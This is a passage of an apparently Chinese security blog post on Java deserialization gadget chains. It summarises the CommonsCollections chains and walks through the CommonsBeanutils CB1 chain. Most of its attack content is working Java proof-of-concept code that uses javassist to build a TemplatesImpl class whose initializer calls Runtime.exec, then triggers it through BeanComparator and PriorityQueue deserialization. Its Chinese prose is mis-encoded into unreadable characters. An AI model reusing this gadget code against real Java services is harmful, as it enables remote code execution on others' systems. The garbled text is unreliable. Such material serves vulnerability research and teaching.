arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span> (node == <span class="hljs-keyword">null</span>) &#123;<br>            node = arr[<span class="hljs-number">1</span>];<br>        &#125;<br><br>        Field keyF = node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        keyF.setAccessible(<span class="hljs-keyword">true</span>);<br>        keyF.set(node, tiedMapEntry);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(hs);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="CC-ÊÄªÁªì"><a href="#CC-ÊÄªÁªì" class="headerlink" title="CC ÊÄªÁªì"></a>CC ÊÄªÁªì</h2><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/f9bee6c5293b753f2421c47eb8cfb7e38.png" srcset="/img/loading.gif" lazyload></p>
<p><code>CommonsCollections&lt;=3.2.1</code>‰∏ãÁöÑÂèçÂ∫èÂàóÂåñÂà©Áî®ÈìæÁöÑÊÄªÁªìÔºö</p>
<ul>
<li>Ëµ∑ÂßãÁÇπ<ol>
<li><code>AnnotationInvocationHandler</code>ÁöÑ<code>readObject</code></li>
<li><code>BadAttributeValueExpException</code>ÁöÑ<code>readObject</code></li>
<li><code>HashSet</code>ÁöÑ<code>readObject</code></li>
<li><code>Hashtable</code>ÁöÑ<code>readObject</code></li>
</ol>
</li>
<li>ÈáçË¶ÅÁöÑÊâøÊé•ÁÇπ<ol>
<li><code>LazyMap</code>ÁöÑ<code>get</code></li>
<li><code>DefaultedMap</code>ÁöÑ<code>get</code></li>
<li><code>TiedMapEntry</code>ÁöÑ<code>getValue</code></li>
<li><code>Proxy</code>ÁöÑ<code>invoke</code></li>
</ol>
</li>
<li>ÁªàÁÇπ<ol>
<li><code>ChainedTransformer</code>ÁöÑ<code>transform</code></li>
<li><code>InvokerTransformer</code>ÁöÑ<code>transform</code></li>
<li><code>ConstantTransformer</code>ÁöÑ<code>transform</code></li>
</ol>
</li>
</ul>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">ÂêÑexpÁöÑ<span class="hljs-keyword">jdkÈÄÇÁî®ÁâàÊú¨</span><br><span class="hljs-keyword"></span><br><span class="hljs-keyword">jdk7 </span>&gt;= CommonsCollections <span class="hljs-number">1</span>„ÄÅ<span class="hljs-number">3</span><br><span class="hljs-keyword">jdk7 </span>&amp; <span class="hljs-keyword">jdk8 </span>&gt;= CommonsCollections <span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span><br><br>ÂêÑexpÁöÑcommons-collectionsÈÄÇÁî®ÁâàÊú¨<br><br>commons-collections &lt;= <span class="hljs-number">3</span>.<span class="hljs-number">1</span> CommonsCollections <span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">10</span><br>commons-collections &lt;= <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span> CommonsCollections <span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span><br></code></pre></td></tr></table></figure>

<h3 id="ÁâàÊú¨Êõ¥Êñ∞"><a href="#ÁâàÊú¨Êõ¥Êñ∞" class="headerlink" title="ÁâàÊú¨Êõ¥Êñ∞"></a>ÁâàÊú¨Êõ¥Êñ∞</h3><p>Commons-Collections 4.0 Âíå Commons-Collections 3.2.1 ÊòØ‰∏§‰∏™‰∏çÂêåÁöÑÂàÜÊîØ</p>
<ul>
<li><p>commons-collections:commons-collections</p>
</li>
<li><p>org.apache.commons:commons-collections4</p>
</li>
</ul>
<p>Commons-Collections 4 ÊòØÂÆòÊñπ‰∏∫‰∫ÜË∞ÉÊï¥Êû∂ÊûÑÂíå API ËÆæËÆ°‰∏äÁöÑÈóÆÈ¢òÊé®Âá∫ÁöÑÈ°πÁõÆÔºå‰∏çËÉΩÁî®Êù•ÊõøÊç¢ Commons-Collections</p>
<p>ÂØπ‰∫é CC1 Âíå CC3ÔºåÂ¶ÇÊûú‰æùËµñÊòØ Commons-Collections 4.0Ôºå<code>LazyMap.decorate</code>ÈúÄË¶ÅÊõ¥Êç¢‰∏∫<code>LazyMap.lazyMap</code></p>
<p>ÂØπ‰∫é Commons-Collections 3.2.2Ôºå<code>readObject</code>Â¢ûÂä†‰∫Ü<code>FunctorUtils.checkUnsafeSerialization</code></p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/t01eee470f626eda79e.png" srcset="/img/loading.gif" lazyload></p>
<p>UNSAFE_SERIALIZABLE_PROPERTY ÁöÑÂÄºÈªòËÆ§‰∏∫ falseÔºåÂ¶ÇÊûúÈúÄË¶Å‰∏∫ trueÔºåÈúÄË¶ÅÂú®ËøêË°åÊó∂ÊåáÂÆö</p>
<p>‰ΩøÁî® InvokerTransformer ‰Ωú‰∏∫ÂèçÂ∫èÂàóÂåñÂà©Áî®ÈìæÁöÑ‰∏ÄÈÉ®ÂàÜÊó∂Ôºå‰ºö throw ‰∏Ä‰∏™ exception</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">CloneTransformer</span><br><span class="hljs-keyword"></span>ForClosure<br><span class="hljs-keyword">InstantiateFactory</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">InstantiateTransformer</span><br><span class="hljs-keyword"></span>InvokerTransformer<br>PrototypeCloneFactory<br>PrototypeSerializationFactory<br>WhileClosure<br></code></pre></td></tr></table></figure>

<p>ËÄå 4.1 ÁöÑ‰øÆÂ§çÊñπÂºèÔºåÂç±Èô©ÁöÑ<code>Transformer</code>‰∏çÂÜçÂÆûÁé∞<code>Serializable</code>Êé•Âè£</p>
<h2 id="CommonsBeanutils"><a href="#CommonsBeanutils" class="headerlink" title="CommonsBeanutils"></a>CommonsBeanutils</h2><p>Apache Commons Beanutils ÊòØ Apache Commons Â∑•ÂÖ∑ÈõÜ‰∏ãÁöÑÂè¶‰∏Ä‰∏™È°πÁõÆÔºåÂÆÉÊèê‰æõ‰∫ÜÂØπÊôÆÈÄö Java Á±ªÂØπ Ë±°Ôºà‰πüÁß∞‰∏∫ JavaBeanÔºâÁöÑ‰∏Ä‰∫õÊìç‰ΩúÊñπÊ≥ï„ÄÇ</p>
<h3 id="Pre-12"><a href="#Pre-12" class="headerlink" title="Pre"></a>Pre</h3><h4 id="ÈôêÂà∂-12"><a href="#ÈôêÂà∂-12" class="headerlink" title="ÈôêÂà∂"></a>ÈôêÂà∂</h4><blockquote>
<p>jdk ÊöÇÊó†ÈôêÂà∂</p>
<p>commons-beanutils</p>
</blockquote>
<h4 id="Âà©Áî®Èìæ-12"><a href="#Âà©Áî®Èìæ-12" class="headerlink" title="Âà©Áî®Èìæ"></a>Âà©Áî®Èìæ</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>heapify<span class="hljs-literal">()</span><br>	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">Down()</span><br>	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">DownUsingComparator()</span><br>		<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">BeanComparator</span>.</span></span>compare<span class="hljs-literal">()</span><br>			<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PropertyUtils</span>.</span></span>get<span class="hljs-constructor">Property()</span><br>				<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">OutputProperties()</span><br>				<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>				<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>					<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure>

<h4 id="ÂÖ≥ÈîÆÁ±ª-12"><a href="#ÂÖ≥ÈîÆÁ±ª-12" class="headerlink" title="ÂÖ≥ÈîÆÁ±ª"></a>ÂÖ≥ÈîÆÁ±ª</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ClassPool</span><br><span class="hljs-attribute">CtClass</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">AbstractTranslet</span><br><span class="hljs-attribute">TemplatesImpl</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">BeanComparator</span><br><span class="hljs-attribute">PropertyUtils</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">PriorityQueue</span><br></code></pre></td></tr></table></figure>

<h4 id="JavaBean"><a href="#JavaBean" class="headerlink" title="JavaBean"></a>JavaBean</h4><p>‰ªÄ‰πàÊòØ JavaBeanÔºå‰∏Ä‰∏™Á±ªÔºö</p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">ÊâÄÊúâÂ±ûÊÄß‰∏∫<span class="hljs-keyword">private</span><br>Êèê‰æõgetterÂíåsetterËØªÂèñ<span class="hljs-keyword">private</span>Â±ûÊÄß<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsBeanutils.Beandemo;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> id;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getId</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> id;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setId</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.id = id;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">User</span><span class="hljs-params">(String name, <span class="hljs-keyword">int</span> id)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>        <span class="hljs-keyword">this</span>.id = id;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="PropertyUtils"><a href="#PropertyUtils" class="headerlink" title="PropertyUtils"></a>PropertyUtils</h4><p>common-beanutils Êèê‰æõ‰∫Ü<code>PropertyUtils.getProperty</code>ÂèØ‰ª•Áõ¥Êé•Ë∞ÉÁî®‰ªªÊÑè JavaBean ÁöÑ getter</p>
<blockquote>
<p>Exception in thread ‚Äúmain‚Äù java.lang.NoClassDefFoundError: org/apache/commons/logging/LogFactory<br>at org.apache.commons.beanutils.ConvertUtilsBean.<init>(ConvertUtilsBean.java:157)<br>at org.apache.commons.beanutils.BeanUtilsBean.<init>(BeanUtilsBean.java:117)<br>at org.apache.commons.beanutils.BeanUtilsBean$1.initialValue(BeanUtilsBean.java:68)<br>    at org.apache.commons.beanutils.ContextClassLoaderLocal.get(ContextClassLoaderLocal.java:153)<br>    at org.apache.commons.beanutils.BeanUtilsBean.getInstance(BeanUtilsBean.java:80)<br>    at org.apache.commons.beanutils.PropertyUtilsBean.getInstance(PropertyUtilsBean.java:114)<br>    at org.apache.commons.beanutils.PropertyUtils.getProperty(PropertyUtils.java:426)<br>    at CommonsBeanutils.Beandemo.Demo.main(Demo.java:9)<br>Caused by: java.lang.ClassNotFoundException: org.apache.commons.logging.LogFactory<br>    at java.net.URLClassLoader.findClass(URLClassLoader.java:381)<br>    at java.lang.ClassLoader.loadClass(ClassLoader.java:424)<br>    at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:331)<br>at java.lang.ClassLoader.loadClass(ClassLoader.java:357)<br>‚Ä¶ 8 more</p>
</blockquote>
<p>Âú® pom.xml Ê∑ªÂä†‰æùËµñ</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-logging<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-logging<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsBeanutils.Beandemo;<br><br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException </span>&#123;<br>        User user = <span class="hljs-keyword">new</span> User(<span class="hljs-string">&quot;default&quot;</span>, <span class="hljs-number">1</span>);<br>        System.out.println(PropertyUtils.getProperty(user, <span class="hljs-string">&quot;name&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>Á∫µËßÇ‰ΩøÁî®Âà∞‰∫Ü<code>TemplatesImpl</code>ÁöÑÈìæÔºåÈÉΩÊòØË∞ÉÁî®‰∫Ü<code>TemplatesImpl.newTransformer</code>ÊàñËÄÖ<code>TemplatesImpl.getOutputProperties</code>Ôºå‰∏§ËÄÖÁöÑ‰ΩúÁî®ÂüüÈÉΩÊòØ publicÔºõÂÖ∂‰∏≠<code>getOutputProperties</code>ÂÜÖÈÉ®Ë∞ÉÁî®‰∫Ü<code>newTransformer</code></p>
<p>ËøôÈáåÊ≥®ÊÑèÂà∞<code>getOutputProperties</code>ÊòØ‰∏Ä‰∏™ getterÔºå<code>TemplatesImpl</code>ÊòØ‰∏Ä‰∏™ JavaBean</p>
<p>poc</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsBeanutils;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><span class="hljs-keyword">import</span> org.apache.commons.lang3.RandomStringUtils;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CB1poc</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException, IOException, InvocationTargetException, IllegalAccessException, NoSuchMethodException </span>&#123;<br>        Random random = <span class="hljs-keyword">new</span> Random();<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        String suffix = RandomStringUtils.randomAlphabetic(<span class="hljs-number">5</span>);<br>        suffix = Character.toUpperCase(suffix.charAt(<span class="hljs-number">0</span>)) + suffix.substring(<span class="hljs-number">1</span>).toLowerCase();<br>        Long timestamp = System.currentTimeMillis();<br>        String prefix = Long.toString(timestamp);<br>        CtClass ctClass = cp.makeClass(random.nextInt() + prefix.substring(<span class="hljs-number">0</span>, <span class="hljs-number">6</span>) + suffix);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(cmd);<br>        ctClass.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-keyword">byte</span>[] bytes = ctClass.toBytecode();<br><br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br>        PropertyUtils.getProperty(templatesimpl, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="Gadget-12"><a href="#Gadget-12" class="headerlink" title="Gadget"></a>Gadget</h3><p>Â¶Ç‰ΩïÂª∂Èïø<code>PropertyUtils.getProperty</code>ÔºåÊü•ÊâæÁî®Ê≥ïÂèëÁé∞Âú®<code>BeanComparator.compare</code>ÊúâË∞ÉÁî®Âà∞</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">( Object o1, Object o2 )</span> </span>&#123;<br><br>    <span class="hljs-keyword">if</span> ( property == <span class="hljs-keyword">null</span> ) &#123;<br>        <span class="hljs-comment">// compare the actual objects</span><br>        <span class="hljs-keyword">return</span> comparator.compare( o1, o2 );<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        Object value1 = PropertyUtils.getProperty( o1, property );<br>        Object value2 = PropertyUtils.getProperty( o2, property );<br>        <span class="hljs-keyword">return</span> comparator.compare( value1, value2 );<br>    &#125;<br>    <span class="hljs-keyword">catch</span><br>        ...<br></code></pre></td></tr></table></figure>

<p>ÂæàÊòæÁÑ∂ÔºåÂΩì o1 ÊòØ<code>TemplatesUImpl</code>ÂØπË±°Êó∂Ôºåproperty ÊòØ<code>outputProperties</code>ÔºåÈìæÂ≠êÂ∞±ÈÄö‰∫Ü</p>
<p>comparatorÔºüÁ≠âÁ≠âÔºåCC2 Â•ΩÂÉèÊúâ<code>TransformingComparator</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(newTransformer);<br>PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);<br>Object[] queue_array = <span class="hljs-keyword">new</span> Object[]&#123;templatesimpl, <span class="hljs-number">1</span>&#125;;<br><br>setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, queue_array);<br>setFieldValue(queue, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>setFieldValue(queue, <span class="hljs-string">&quot;comparator&quot;</span>, transformingComparator);<br></code></pre></td></tr></table></figure>

<p><code>PriorityQueue.readObject-&gt;heapify-&gt;siftDown-&gt;siftDownUsingComparator</code>ÁÑ∂ÂêéÂ∞±Ë∞ÉÁî®Âà∞‰∫Ü<code>comparator.compare</code>ÔºåCC2 Áî®<code>TransformingComparator</code>ÁöÑÊó∂ÂÄôÂèçÂ∞Ñ‰øÆÊîπÁöÑ<code>comparator</code>ÔºåËøôÈáåÂΩìÁÑ∂‰πüÂèØ‰ª•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsBeanutils;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.lang3.RandomStringUtils;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CB1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span 